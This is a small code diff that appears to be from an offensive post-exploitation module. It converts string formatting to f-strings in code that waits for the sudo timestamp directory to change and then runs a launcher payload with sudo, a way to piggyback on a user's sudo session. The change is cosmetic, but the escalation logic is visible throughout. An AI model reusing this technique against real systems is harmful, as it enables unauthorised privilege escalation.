@@ -31,8 +31,8 @@ class Module:
             launcher = launcher.replace("'", "\\'")
             launcher = launcher.replace("echo", "")
             parts = launcher.split("|")
-            launcher = "sudo python -c %s" % (parts[0])
-            script = """
+            launcher = f"sudo python -c {parts[0]}"
+            script = f"""
 import os
 import time
 import subprocess
@@ -44,12 +44,10 @@ while exitLoop is False:
     newTime = time.ctime(os.path.getmtime(sudoDir))
     if oldTime != newTime:
         try:
-            subprocess.call(['%s'], shell=True)
+            subprocess.call(['{launcher}'], shell=True)
             exitLoop = True
         except:
             pass
-            """ % (
-                launcher
-            )
+            """
 
             return script
